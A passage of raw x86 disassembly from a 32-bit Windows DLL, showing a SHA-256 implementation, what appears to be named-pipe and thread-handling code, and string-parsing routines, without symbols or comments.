10006c04:	56                   	push   %esi
10006c05:	57                   	push   %edi
10006c06:	8d 70 10             	lea    0x10(%eax),%esi
10006c09:	56                   	push   %esi
10006c0a:	ff 15 6c e0 00 10    	call   *0x1000e06c
10006c10:	8d 7c 00 02          	lea    0x2(%eax,%eax,1),%edi
10006c14:	57                   	push   %edi
10006c15:	56                   	push   %esi
10006c16:	ff 75 08             	pushl  0x8(%ebp)
10006c19:	e8 f2 70 00 00       	call   0x1000dd10
10006c1e:	83 c4 0c             	add    $0xc,%esp
10006c21:	8b c7                	mov    %edi,%eax
10006c23:	5f                   	pop    %edi
10006c24:	5e                   	pop    %esi
10006c25:	5d                   	pop    %ebp
10006c26:	c2 04 00             	ret    $0x4
10006c29:	55                   	push   %ebp
10006c2a:	8b ec                	mov    %esp,%ebp
10006c2c:	81 ec 04 02 00 00    	sub    $0x204,%esp
10006c32:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
10006c38:	50                   	push   %eax
10006c39:	8b 45 08             	mov    0x8(%ebp),%eax
10006c3c:	e8 c0 ff ff ff       	call   0x10006c01
10006c41:	85 c0                	test   %eax,%eax
10006c43:	75 0a                	jne    0x10006c4f
10006c45:	b8 4f 05 00 00       	mov    $0x54f,%eax
10006c4a:	e9 c0 00 00 00       	jmp    0x10006d0f
10006c4f:	8b 45 08             	mov    0x8(%ebp),%eax
10006c52:	e8 37 19 00 00       	call   0x1000858e
10006c57:	83 f8 01             	cmp    $0x1,%eax
10006c5a:	0f 85 ad 00 00 00    	jne    0x10006d0d
10006c60:	53                   	push   %ebx
10006c61:	56                   	push   %esi
10006c62:	57                   	push   %edi
10006c63:	33 db                	xor    %ebx,%ebx
10006c65:	8b 45 08             	mov    0x8(%ebp),%eax
10006c68:	e8 b8 00 00 00       	call   0x10006d25
10006c6d:	50                   	push   %eax
10006c6e:	53                   	push   %ebx
10006c6f:	b8 00 00 80 00       	mov    $0x800000,%eax
10006c74:	50                   	push   %eax
10006c75:	50                   	push   %eax
10006c76:	68 ff 00 00 00       	push   $0xff
10006c7b:	6a 06                	push   $0x6
10006c7d:	6a 03                	push   $0x3
10006c7f:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
10006c85:	50                   	push   %eax
10006c86:	ff 15 b8 e0 00 10    	call   *0x1000e0b8
10006c8c:	8b f8                	mov    %eax,%edi
10006c8e:	83 ff ff             	cmp    $0xffffffff,%edi
10006c91:	74 66                	je     0x10006cf9
10006c93:	53                   	push   %ebx
10006c94:	57                   	push   %edi
10006c95:	ff 15 b4 e0 00 10    	call   *0x1000e0b4
10006c9b:	3b c3                	cmp    %ebx,%eax
10006c9d:	75 12                	jne    0x10006cb1
10006c9f:	ff 15 4c e1 00 10    	call   *0x1000e14c
10006ca5:	2d 17 02 00 00       	sub    $0x217,%eax
10006caa:	f7 d8                	neg    %eax
10006cac:	1b c0                	sbb    %eax,%eax
10006cae:	40                   	inc    %eax
10006caf:	74 48                	je     0x10006cf9
10006cb1:	6a 0c                	push   $0xc
10006cb3:	e8 2c fd ff ff       	call   0x100069e4
10006cb8:	8b f0                	mov    %eax,%esi
10006cba:	59                   	pop    %ecx
10006cbb:	3b f3                	cmp    %ebx,%esi
10006cbd:	74 3a                	je     0x10006cf9
10006cbf:	8b 45 08             	mov    0x8(%ebp),%eax
10006cc2:	89 46 04             	mov    %eax,0x4(%esi)
10006cc5:	8d 45 fc             	lea    -0x4(%ebp),%eax
10006cc8:	50                   	push   %eax
10006cc9:	53                   	push   %ebx
10006cca:	56                   	push   %esi
10006ccb:	68 09 6b 00 10       	push   $0x10006b09
10006cd0:	53                   	push   %ebx
10006cd1:	53                   	push   %ebx
10006cd2:	89 3e                	mov    %edi,(%esi)
10006cd4:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
10006cdb:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006cde:	ff 15 54 e1 00 10    	call   *0x1000e154
10006ce4:	3b c3                	cmp    %ebx,%eax
10006ce6:	74 03                	je     0x10006ceb
10006ce8:	50                   	push   %eax
10006ce9:	eb 08                	jmp    0x10006cf3
10006ceb:	56                   	push   %esi
10006cec:	e8 22 fd ff ff       	call   0x10006a13
10006cf1:	59                   	pop    %ecx
10006cf2:	57                   	push   %edi
10006cf3:	ff 15 50 e1 00 10    	call   *0x1000e150
10006cf9:	8b 45 08             	mov    0x8(%ebp),%eax
10006cfc:	e8 8d 18 00 00       	call   0x1000858e
10006d01:	83 f8 01             	cmp    $0x1,%eax
10006d04:	0f 84 5b ff ff ff    	je     0x10006c65
10006d0a:	5f                   	pop    %edi
10006d0b:	5e                   	pop    %esi
10006d0c:	5b                   	pop    %ebx
10006d0d:	33 c0                	xor    %eax,%eax
10006d0f:	c9                   	leave  
10006d10:	c2 04 00             	ret    $0x4
10006d13:	c7 40 0c 27 74 00 10 	movl   $0x10007427,0xc(%eax)
10006d1a:	89 48 08             	mov    %ecx,0x8(%eax)
10006d1d:	c3                   	ret    
10006d1e:	89 88 10 02 00 00    	mov    %ecx,0x210(%eax)
10006d24:	c3                   	ret    
10006d25:	8b 80 10 02 00 00    	mov    0x210(%eax),%eax
10006d2b:	c3                   	ret    
10006d2c:	8b 40 0c             	mov    0xc(%eax),%eax
10006d2f:	c3                   	ret    
10006d30:	68 24 eb 00 10       	push   $0x1000eb24
10006d35:	83 c0 10             	add    $0x10,%eax
10006d38:	50                   	push   %eax
10006d39:	ff 15 c4 e0 00 10    	call   *0x1000e0c4
10006d3f:	33 c0                	xor    %eax,%eax
10006d41:	40                   	inc    %eax
10006d42:	c3                   	ret    
10006d43:	83 38 01             	cmpl   $0x1,(%eax)
10006d46:	75 05                	jne    0x10006d4d
10006d48:	e9 34 00 00 00       	jmp    0x10006d81
10006d4d:	c3                   	ret    
10006d4e:	68 14 02 00 00       	push   $0x214
10006d53:	e8 8c fc ff ff       	call   0x100069e4
10006d58:	59                   	pop    %ecx
10006d59:	c3                   	ret    
10006d5a:	55                   	push   %ebp
10006d5b:	8b ec                	mov    %esp,%ebp
10006d5d:	51                   	push   %ecx
10006d5e:	33 c0                	xor    %eax,%eax
10006d60:	8d 4d fc             	lea    -0x4(%ebp),%ecx
10006d63:	51                   	push   %ecx
10006d64:	50                   	push   %eax
10006d65:	56                   	push   %esi
10006d66:	68 29 6c 00 10       	push   $0x10006c29
10006d6b:	50                   	push   %eax
10006d6c:	50                   	push   %eax
10006d6d:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
10006d73:	89 45 fc             	mov    %eax,-0x4(%ebp)
10006d76:	ff 15 54 e1 00 10    	call   *0x1000e154
10006d7c:	89 46 04             	mov    %eax,0x4(%esi)
10006d7f:	c9                   	leave  
10006d80:	c3                   	ret    
10006d81:	6a 00                	push   $0x0
10006d83:	ff 70 04             	pushl  0x4(%eax)
10006d86:	ff 15 6c e1 00 10    	call   *0x1000e16c
10006d8c:	c3                   	ret    
10006d8d:	55                   	push   %ebp
10006d8e:	8b ec                	mov    %esp,%ebp
10006d90:	8b 45 08             	mov    0x8(%ebp),%eax
10006d93:	81 ec 20 01 00 00    	sub    $0x120,%esp
10006d99:	56                   	push   %esi
10006d9a:	57                   	push   %edi
10006d9b:	6a 08                	push   $0x8
10006d9d:	8b f0                	mov    %eax,%esi
10006d9f:	59                   	pop    %ecx
10006da0:	8d 7d e0             	lea    -0x20(%ebp),%edi
10006da3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
10006da5:	33 f6                	xor    %esi,%esi
10006da7:	83 c0 29             	add    $0x29,%eax
10006daa:	8a 48 ff             	mov    -0x1(%eax),%cl
10006dad:	0f b6 d1             	movzbl %cl,%edx
10006db0:	8a 08                	mov    (%eax),%cl
10006db2:	c1 e2 08             	shl    $0x8,%edx
10006db5:	0f b6 c9             	movzbl %cl,%ecx
10006db8:	0b ca                	or     %edx,%ecx
10006dba:	8a 50 01             	mov    0x1(%eax),%dl
10006dbd:	c1 e1 08             	shl    $0x8,%ecx
10006dc0:	0f b6 d2             	movzbl %dl,%edx
10006dc3:	0b d1                	or     %ecx,%edx
10006dc5:	8a 48 02             	mov    0x2(%eax),%cl
10006dc8:	c1 e2 08             	shl    $0x8,%edx
10006dcb:	0f b6 c9             	movzbl %cl,%ecx
10006dce:	0b ca                	or     %edx,%ecx
10006dd0:	89 8c b5 e0 fe ff ff 	mov    %ecx,-0x120(%ebp,%esi,4)
10006dd7:	46                   	inc    %esi
10006dd8:	83 c0 04             	add    $0x4,%eax
10006ddb:	83 fe 10             	cmp    $0x10,%esi
10006dde:	7c ca                	jl     0x10006daa
10006de0:	6a 30                	push   $0x30
10006de2:	5e                   	pop    %esi
10006de3:	8d 85 18 ff ff ff    	lea    -0xe8(%ebp),%eax
10006de9:	53                   	push   %ebx
10006dea:	8b 48 cc             	mov    -0x34(%eax),%ecx
10006ded:	8b 10                	mov    (%eax),%edx
10006def:	8b f9                	mov    %ecx,%edi
10006df1:	c1 c7 0e             	rol    $0xe,%edi
10006df4:	8b d9                	mov    %ecx,%ebx
10006df6:	c1 e9 03             	shr    $0x3,%ecx
10006df9:	c1 cb 07             	ror    $0x7,%ebx
10006dfc:	33 fb                	xor    %ebx,%edi
10006dfe:	33 f9                	xor    %ecx,%edi
10006e00:	8b ca                	mov    %edx,%ecx
10006e02:	c1 c1 0f             	rol    $0xf,%ecx
10006e05:	8b da                	mov    %edx,%ebx
10006e07:	c1 c3 0d             	rol    $0xd,%ebx
10006e0a:	33 cb                	xor    %ebx,%ecx
10006e0c:	c1 ea 0a             	shr    $0xa,%edx
10006e0f:	33 ca                	xor    %edx,%ecx
10006e11:	03 f9                	add    %ecx,%edi
10006e13:	03 78 c8             	add    -0x38(%eax),%edi
10006e16:	83 c0 04             	add    $0x4,%eax
10006e19:	03 78 e8             	add    -0x18(%eax),%edi
10006e1c:	4e                   	dec    %esi
10006e1d:	89 78 04             	mov    %edi,0x4(%eax)
10006e20:	75 c8                	jne    0x10006dea
10006e22:	8b 75 f0             	mov    -0x10(%ebp),%esi
10006e25:	33 d2                	xor    %edx,%edx
10006e27:	8b 7d f4             	mov    -0xc(%ebp),%edi
10006e2a:	8b c6                	mov    %esi,%eax
10006e2c:	c1 c8 0b             	ror    $0xb,%eax
10006e2f:	8b ce                	mov    %esi,%ecx
10006e31:	c1 c1 07             	rol    $0x7,%ecx
10006e34:	33 c1                	xor    %ecx,%eax
10006e36:	23 fe                	and    %esi,%edi
10006e38:	8b ce                	mov    %esi,%ecx
10006e3a:	c1 c9 06             	ror    $0x6,%ecx
10006e3d:	33 c1                	xor    %ecx,%eax
10006e3f:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
10006e42:	8b ce                	mov    %esi,%ecx
10006e44:	f7 d1                	not    %ecx
10006e46:	23 4d f8             	and    -0x8(%ebp),%ecx
10006e49:	23 5d e0             	and    -0x20(%ebp),%ebx
10006e4c:	33 cf                	xor    %edi,%ecx
10006e4e:	8b 7d e0             	mov    -0x20(%ebp),%edi
10006e51:	03 c1                	add    %ecx,%eax
10006e53:	03 82 60 e8 00 10    	add    0x1000e860(%edx),%eax
10006e59:	8b 4d e0             	mov    -0x20(%ebp),%ecx
10006e5c:	03 84 15 e0 fe ff ff 	add    -0x120(%ebp,%edx,1),%eax
10006e63:	83 c2 04             	add    $0x4,%edx
10006e66:	03 45 fc             	add    -0x4(%ebp),%eax
10006e69:	c1 c9 0d             	ror    $0xd,%ecx
10006e6c:	c1 c7 0a             	rol    $0xa,%edi
10006e6f:	33 cf                	xor    %edi,%ecx
10006e71:	8b 7d e0             	mov    -0x20(%ebp),%edi
10006e74:	c1 cf 02             	ror    $0x2,%edi
10006e77:	33 cf                	xor    %edi,%ecx
10006e79:	8b 7d e4             	mov    -0x1c(%ebp),%edi
10006e7c:	33 7d e0             	xor    -0x20(%ebp),%edi
10006e7f:	23 7d e8             	and    -0x18(%ebp),%edi
10006e82:	33 fb                	xor    %ebx,%edi
10006e84:	03 cf                	add    %edi,%ecx
10006e86:	8b 7d f8             	mov    -0x8(%ebp),%edi
10006e89:	89 7d fc             	mov    %edi,-0x4(%ebp)
10006e8c:	8b 7d f4             	mov    -0xc(%ebp),%edi
10006e8f:	89 7d f8             	mov    %edi,-0x8(%ebp)
10006e92:	8b 7d e8             	mov    -0x18(%ebp),%edi
10006e95:	89 75 f4             	mov    %esi,-0xc(%ebp)
10006e98:	8b 75 ec             	mov    -0x14(%ebp),%esi
10006e9b:	89 7d ec             	mov    %edi,-0x14(%ebp)
10006e9e:	8b 7d e4             	mov    -0x1c(%ebp),%edi
10006ea1:	89 7d e8             	mov    %edi,-0x18(%ebp)
10006ea4:	8b 7d e0             	mov    -0x20(%ebp),%edi
10006ea7:	03 c8                	add    %eax,%ecx
10006ea9:	03 f0                	add    %eax,%esi
10006eab:	89 7d e4             	mov    %edi,-0x1c(%ebp)
10006eae:	89 4d e0             	mov    %ecx,-0x20(%ebp)
10006eb1:	81 fa 00 01 00 00    	cmp    $0x100,%edx
10006eb7:	0f 8c 6a ff ff ff    	jl     0x10006e27
10006ebd:	8b 45 08             	mov    0x8(%ebp),%eax
10006ec0:	6a 08                	push   $0x8
10006ec2:	8d 4d e0             	lea    -0x20(%ebp),%ecx
10006ec5:	5a                   	pop    %edx
10006ec6:	89 75 f0             	mov    %esi,-0x10(%ebp)
10006ec9:	2b c8                	sub    %eax,%ecx
10006ecb:	5b                   	pop    %ebx
10006ecc:	8b 34 01             	mov    (%ecx,%eax,1),%esi
10006ecf:	01 30                	add    %esi,(%eax)
10006ed1:	83 c0 04             	add    $0x4,%eax
10006ed4:	4a                   	dec    %edx
10006ed5:	75 f5                	jne    0x10006ecc
10006ed7:	5f                   	pop    %edi
10006ed8:	5e                   	pop    %esi
10006ed9:	c9                   	leave  
10006eda:	c3                   	ret    
10006edb:	83 60 20 00          	andl   $0x0,0x20(%eax)
10006edf:	83 60 24 00          	andl   $0x0,0x24(%eax)
10006ee3:	c7 00 67 e6 09 6a    	movl   $0x6a09e667,(%eax)
10006ee9:	c7 40 04 85 ae 67 bb 	movl   $0xbb67ae85,0x4(%eax)
10006ef0:	c7 40 08 72 f3 6e 3c 	movl   $0x3c6ef372,0x8(%eax)
10006ef7:	c7 40 0c 3a f5 4f a5 	movl   $0xa54ff53a,0xc(%eax)
10006efe:	c7 40 10 7f 52 0e 51 	movl   $0x510e527f,0x10(%eax)
10006f05:	c7 40 14 8c 68 05 9b 	movl   $0x9b05688c,0x14(%eax)
10006f0c:	c7 40 18 ab d9 83 1f 	movl   $0x1f83d9ab,0x18(%eax)
10006f13:	c7 40 1c 19 cd e0 5b 	movl   $0x5be0cd19,0x1c(%eax)
10006f1a:	c3                   	ret    
10006f1b:	55                   	push   %ebp
10006f1c:	8b ec                	mov    %esp,%ebp
10006f1e:	57                   	push   %edi
10006f1f:	8b f8                	mov    %eax,%edi
10006f21:	eb 28                	jmp    0x10006f4b
10006f23:	8a 07                	mov    (%edi),%al
10006f25:	8b 4e 24             	mov    0x24(%esi),%ecx
10006f28:	ff 4d 08             	decl   0x8(%ebp)
10006f2b:	88 44 31 28          	mov    %al,0x28(%ecx,%esi,1)
10006f2f:	ff 46 24             	incl   0x24(%esi)
10006f32:	47                   	inc    %edi
10006f33:	83 7e 24 40          	cmpl   $0x40,0x24(%esi)
10006f37:	75 12                	jne    0x10006f4b
10006f39:	56                   	push   %esi
10006f3a:	e8 4e fe ff ff       	call   0x10006d8d
10006f3f:	81 46 20 00 02 00 00 	addl   $0x200,0x20(%esi)
10006f46:	83 66 24 00          	andl   $0x0,0x24(%esi)
10006f4a:	59                   	pop    %ecx
10006f4b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
10006f4f:	75 d2                	jne    0x10006f23
10006f51:	5f                   	pop    %edi
10006f52:	5d                   	pop    %ebp
10006f53:	c3                   	ret    
10006f54:	55                   	push   %ebp
10006f55:	8b ec                	mov    %esp,%ebp
10006f57:	8b 46 24             	mov    0x24(%esi),%eax
10006f5a:	8b c8                	mov    %eax,%ecx
10006f5c:	c1 e1 03             	shl    $0x3,%ecx
10006f5f:	01 4e 20             	add    %ecx,0x20(%esi)
10006f62:	c6 44 30 28 80       	movb   $0x80,0x28(%eax,%esi,1)
10006f67:	ff 46 24             	incl   0x24(%esi)
10006f6a:	8b 46 24             	mov    0x24(%esi),%eax
10006f6d:	83 f8 38             	cmp    $0x38,%eax
10006f70:	72 2a                	jb     0x10006f9c
10006f72:	eb 0b                	jmp    0x10006f7f
10006f74:	c6 44 30 28 00       	movb   $0x0,0x28(%eax,%esi,1)
10006f79:	ff 46 24             	incl   0x24(%esi)
10006f7c:	8b 46 24             	mov    0x24(%esi),%eax
10006f7f:	83 f8 40             	cmp    $0x40,%eax
10006f82:	72 f0                	jb     0x10006f74
10006f84:	56                   	push   %esi
10006f85:	e8 03 fe ff ff       	call   0x10006d8d
10006f8a:	83 66 24 00          	andl   $0x0,0x24(%esi)
10006f8e:	59                   	pop    %ecx
10006f8f:	eb 0b                	jmp    0x10006f9c
10006f91:	8b 46 24             	mov    0x24(%esi),%eax
10006f94:	c6 44 06 28 00       	movb   $0x0,0x28(%esi,%eax,1)
10006f99:	ff 46 24             	incl   0x24(%esi)
10006f9c:	83 7e 24 38          	cmpl   $0x38,0x24(%esi)
10006fa0:	72 ef                	jb     0x10006f91
10006fa2:	6a 38                	push   $0x38
10006fa4:	58                   	pop    %eax
10006fa5:	c6 44 06 28 00       	movb   $0x0,0x28(%esi,%eax,1)
10006faa:	40                   	inc    %eax
10006fab:	83 f8 3c             	cmp    $0x3c,%eax
10006fae:	7c f5                	jl     0x10006fa5
10006fb0:	6a 3c                	push   $0x3c
10006fb2:	58                   	pop    %eax
10006fb3:	8b 56 20             	mov    0x20(%esi),%edx
10006fb6:	6a 3f                	push   $0x3f
10006fb8:	59                   	pop    %ecx
10006fb9:	2b c8                	sub    %eax,%ecx
10006fbb:	c1 e1 03             	shl    $0x3,%ecx
10006fbe:	d3 ea                	shr    %cl,%edx
10006fc0:	40                   	inc    %eax
10006fc1:	88 54 06 27          	mov    %dl,0x27(%esi,%eax,1)
10006fc5:	83 f8 40             	cmp    $0x40,%eax
10006fc8:	7c e9                	jl     0x10006fb3
10006fca:	56                   	push   %esi
10006fcb:	e8 bd fd ff ff       	call   0x10006d8d
10006fd0:	59                   	pop    %ecx
10006fd1:	33 c0                	xor    %eax,%eax
10006fd3:	83 c9 ff             	or     $0xffffffff,%ecx
10006fd6:	2b c8                	sub    %eax,%ecx
10006fd8:	8b d0                	mov    %eax,%edx
10006fda:	c1 fa 02             	sar    $0x2,%edx
10006fdd:	8b 14 96             	mov    (%esi,%edx,4),%edx
10006fe0:	83 e1 03             	and    $0x3,%ecx
10006fe3:	c1 e1 03             	shl    $0x3,%ecx
10006fe6:	d3 ea                	shr    %cl,%edx
10006fe8:	8b 4d 08             	mov    0x8(%ebp),%ecx
10006feb:	88 14 08             	mov    %dl,(%eax,%ecx,1)
10006fee:	40                   	inc    %eax
10006fef:	83 f8 20             	cmp    $0x20,%eax
10006ff2:	7c df                	jl     0x10006fd3
10006ff4:	5d                   	pop    %ebp
10006ff5:	c3                   	ret    
10006ff6:	55                   	push   %ebp
10006ff7:	8b ec                	mov    %esp,%ebp
10006ff9:	83 e4 f8             	and    $0xfffffff8,%esp
10006ffc:	83 ec 6c             	sub    $0x6c,%esp
10006fff:	56                   	push   %esi
10007000:	8d 44 24 08          	lea    0x8(%esp),%eax
10007004:	e8 d2 fe ff ff       	call   0x10006edb
10007009:	ff 75 0c             	pushl  0xc(%ebp)
1000700c:	8b 45 08             	mov    0x8(%ebp),%eax
1000700f:	8d 74 24 0c          	lea    0xc(%esp),%esi
10007013:	e8 03 ff ff ff       	call   0x10006f1b
10007018:	ff 75 10             	pushl  0x10(%ebp)
1000701b:	e8 34 ff ff ff       	call   0x10006f54
10007020:	59                   	pop    %ecx
10007021:	59                   	pop    %ecx
10007022:	5e                   	pop    %esi
10007023:	8b e5                	mov    %ebp,%esp
10007025:	5d                   	pop    %ebp
10007026:	c3                   	ret    
10007027:	55                   	push   %ebp
10007028:	8b ec                	mov    %esp,%ebp
1000702a:	83 ec 44             	sub    $0x44,%esp
1000702d:	57                   	push   %edi
1000702e:	68 50 ea 00 10       	push   $0x1000ea50
10007033:	6a 40                	push   $0x40
10007035:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
1000703a:	58                   	pop    %eax
1000703b:	8d 4d bc             	lea    -0x44(%ebp),%ecx
1000703e:	e8 5f be ff ff       	call   0x10002ea2
10007043:	ff 75 10             	pushl  0x10(%ebp)
10007046:	8d 7d bc             	lea    -0x44(%ebp),%edi
10007049:	6a 40                	push   $0x40
1000704b:	e8 cc bd ff ff       	call   0x10002e1c
10007050:	85 c0                	test   %eax,%eax
10007052:	79 07                	jns    0x1000705b
10007054:	33 c0                	xor    %eax,%eax
10007056:	e9 e2 00 00 00       	jmp    0x1000713d
1000705b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000705f:	8b 7d 08             	mov    0x8(%ebp),%edi
10007062:	53                   	push   %ebx
10007063:	8b 1d 8c e1 00 10    	mov    0x1000e18c,%ebx
10007069:	56                   	push   %esi
1000706a:	eb 17                	jmp    0x10007083
1000706c:	8d 45 bc             	lea    -0x44(%ebp),%eax
1000706f:	50                   	push   %eax
10007070:	ff 15 34 e1 00 10    	call   *0x1000e134
10007076:	8a 0c 30             	mov    (%eax,%esi,1),%cl
10007079:	80 f9 20             	cmp    $0x20,%cl
1000707c:	74 17                	je     0x10007095
1000707e:	80 f9 3e             	cmp    $0x3e,%cl
10007081:	74 12                	je     0x10007095
10007083:	8d 45 bc             	lea    -0x44(%ebp),%eax
10007086:	50                   	push   %eax
10007087:	57                   	push   %edi
10007088:	ff d3                	call   *%ebx
1000708a:	8b f0                	mov    %eax,%esi
1000708c:	85 f6                	test   %esi,%esi
1000708e:	75 dc                	jne    0x1000706c
10007090:	e9 a3 00 00 00       	jmp    0x10007138
10007095:	03 f0                	add    %eax,%esi
10007097:	80 3e 3e             	cmpb   $0x3e,(%esi)
1000709a:	74 18                	je     0x100070b4
1000709c:	8b 45 0c             	mov    0xc(%ebp),%eax
1000709f:	03 c7                	add    %edi,%eax
100070a1:	3b f0                	cmp    %eax,%esi
100070a3:	73 06                	jae    0x100070ab
100070a5:	46                   	inc    %esi
100070a6:	80 3e 3e             	cmpb   $0x3e,(%esi)
100070a9:	75 f6                	jne    0x100070a1
100070ab:	80 3e 3e             	cmpb   $0x3e,(%esi)
100070ae:	0f 85 84 00 00 00    	jne    0x10007138
100070b4:	68 54 ea 00 10       	push   $0x1000ea54
100070b9:	6a 40                	push   $0x40
100070bb:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
100070c0:	58                   	pop    %eax
100070c1:	8d 4d bc             	lea    -0x44(%ebp),%ecx
100070c4:	46                   	inc    %esi
100070c5:	e8 d8 bd ff ff       	call   0x10002ea2
100070ca:	ff 75 10             	pushl  0x10(%ebp)
100070cd:	8d 7d bc             	lea    -0x44(%ebp),%edi
100070d0:	6a 40                	push   $0x40
100070d2:	e8 45 bd ff ff       	call   0x10002e1c
100070d7:	68 58 ea 00 10       	push   $0x1000ea58
100070dc:	6a 40                	push   $0x40
100070de:	e8 39 bd ff ff       	call   0x10002e1c
100070e3:	8b c7                	mov    %edi,%eax
100070e5:	50                   	push   %eax
100070e6:	56                   	push   %esi
100070e7:	ff d3                	call   *%ebx
100070e9:	8b f8                	mov    %eax,%edi
100070eb:	85 ff                	test   %edi,%edi
100070ed:	74 49                	je     0x10007138
100070ef:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
100070f2:	2b c6                	sub    %esi,%eax
100070f4:	40                   	inc    %eax
100070f5:	89 45 fc             	mov    %eax,-0x4(%ebp)
100070f8:	85 db                	test   %ebx,%ebx
100070fa:	74 0e                	je     0x1000710a
100070fc:	8d 45 bc             	lea    -0x44(%ebp),%eax
100070ff:	50                   	push   %eax
10007100:	ff 15 34 e1 00 10    	call   *0x1000e134
10007106:	03 c7                	add    %edi,%eax
10007108:	89 03                	mov    %eax,(%ebx)
1000710a:	8b 5d 14             	mov    0x14(%ebp),%ebx
1000710d:	85 db                	test   %ebx,%ebx
1000710f:	74 27                	je     0x10007138
10007111:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
10007115:	74 21                	je     0x10007138
10007117:	8b 7d fc             	mov    -0x4(%ebp),%edi
1000711a:	39 7d 18             	cmp    %edi,0x18(%ebp)
1000711d:	72 15                	jb     0x10007134
1000711f:	8d 47 ff             	lea    -0x1(%edi),%eax
10007122:	50                   	push   %eax
10007123:	56                   	push   %esi
10007124:	53                   	push   %ebx
10007125:	e8 e6 6b 00 00       	call   0x1000dd10
1000712a:	83 c4 0c             	add    $0xc,%esp
1000712d:	c6 44 1f ff 00       	movb   $0x0,-0x1(%edi,%ebx,1)
10007132:	eb 04                	jmp    0x10007138
10007134:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10007138:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000713b:	5e                   	pop    %esi
1000713c:	5b                   	pop    %ebx
1000713d:	5f                   	pop    %edi
1000713e:	c9                   	leave  
1000713f:	c3                   	ret    
10007140:	55                   	push   %ebp
10007141:	8b ec                	mov    %esp,%ebp
10007143:	51                   	push   %ecx
10007144:	51                   	push   %ecx
10007145:	53                   	push   %ebx
10007146:	56                   	push   %esi
10007147:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000714a:	50                   	push   %eax
1000714b:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000714e:	50                   	push   %eax
1000714f:	68 5c ea 00 10       	push   $0x1000ea5c
10007154:	ff b7 18 06 00 00    	pushl  0x618(%edi)
1000715a:	33 db                	xor    %ebx,%ebx
1000715c:	89 5d f8             	mov    %ebx,-0x8(%ebp)
1000715f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10007162:	e8 54 e4 ff ff       	call   0x100055bb
10007167:	83 c4 10             	add    $0x10,%esp
1000716a:	85 c0                	test   %eax,%eax
1000716c:	75 04                	jne    0x10007172
1000716e:	33 c0                	xor    %eax,%eax
10007170:	eb 3c                	jmp    0x100071ae
10007172:	ff 75 fc             	pushl  -0x4(%ebp)
10007175:	8b 77 08             	mov    0x8(%edi),%esi
10007178:	ff 75 f8             	pushl  -0x8(%ebp)
1000717b:	e8 26 19 00 00       	call   0x10008aa6
10007180:	85 c0                	test   %eax,%eax
10007182:	74 ea                	je     0x1000716e
10007184:	8d b7 14 04 00 00    	lea    0x414(%edi),%esi
1000718a:	8b 06                	mov    (%esi),%eax
1000718c:	3b c3                	cmp    %ebx,%eax
1000718e:	74 0f                	je     0x1000719f
10007190:	50                   	push   %eax
10007191:	e8 7d f8 ff ff       	call   0x10006a13
10007196:	59                   	pop    %ecx
10007197:	89 1e                	mov    %ebx,(%esi)
10007199:	89 9f 18 04 00 00    	mov    %ebx,0x418(%edi)
1000719f:	8b 47 08             	mov    0x8(%edi),%eax
100071a2:	8d 9f 18 04 00 00    	lea    0x418(%edi),%ebx
100071a8:	56                   	push   %esi
100071a9:	e8 bb 18 00 00       	call   0x10008a69
100071ae:	5e                   	pop    %esi
100071af:	5b                   	pop    %ebx
100071b0:	c9                   	leave  
100071b1:	c3                   	ret    
100071b2:	68 ff 03 00 00       	push   $0x3ff
100071b7:	56                   	push   %esi
100071b8:	e8 72 e4 ff ff       	call   0x1000562f
100071bd:	59                   	pop    %ecx
100071be:	33 c0                	xor    %eax,%eax
100071c0:	59                   	pop    %ecx
100071c1:	c6 86 ff 03 00 00 00 	movb   $0x0,0x3ff(%esi)
100071c8:	40                   	inc    %eax
100071c9:	c3                   	ret    
100071ca:	55                   	push   %ebp
100071cb:	8b ec                	mov    %esp,%ebp
100071cd:	81 ec 28 04 00 00    	sub    $0x428,%esp
100071d3:	56                   	push   %esi
100071d4:	8d b5 dc fb ff ff    	lea    -0x424(%ebp),%esi
100071da:	e8 d3 ff ff ff       	call   0x100071b2
100071df:	85 c0                	test   %eax,%eax
100071e1:	75 07                	jne    0x100071ea
100071e3:	33 c0                	xor    %eax,%eax
100071e5:	e9 87 00 00 00       	jmp    0x10007271
100071ea:	8d 85 dc fb ff ff    	lea    -0x424(%ebp),%eax
100071f0:	50                   	push   %eax
100071f1:	ff 15 34 e1 00 10    	call   *0x1000e134
100071f7:	83 f8 04             	cmp    $0x4,%eax
100071fa:	7c e7                	jl     0x100071e3
100071fc:	8d 4d dc             	lea    -0x24(%ebp),%ecx
100071ff:	51                   	push   %ecx
10007200:	50                   	push   %eax
10007201:	8d 85 dc fb ff ff    	lea    -0x424(%ebp),%eax
10007207:	50                   	push   %eax
10007208:	e8 e9 fd ff ff       	call   0x10006ff6
1000720d:	0f b6 45 eb          	movzbl -0x15(%ebp),%eax
10007211:	50                   	push   %eax
10007212:	0f b6 45 ea          	movzbl -0x16(%ebp),%eax
10007216:	50                   	push   %eax
10007217:	0f b6 45 e9          	movzbl -0x17(%ebp),%eax
1000721b:	50                   	push   %eax
1000721c:	0f b6 45 e8          	movzbl -0x18(%ebp),%eax
10007220:	50                   	push   %eax
10007221:	0f b6 45 e7          	movzbl -0x19(%ebp),%eax
10007225:	50                   	push   %eax
10007226:	0f b6 45 e6          	movzbl -0x1a(%ebp),%eax
1000722a:	50                   	push   %eax
1000722b:	0f b6 45 e5          	movzbl -0x1b(%ebp),%eax
1000722f:	50                   	push   %eax
10007230:	0f b6 45 e4          	movzbl -0x1c(%ebp),%eax
10007234:	50                   	push   %eax
10007235:	0f b6 45 e3          	movzbl -0x1d(%ebp),%eax
10007239:	50                   	push   %eax
1000723a:	0f b6 45 e2          	movzbl -0x1e(%ebp),%eax
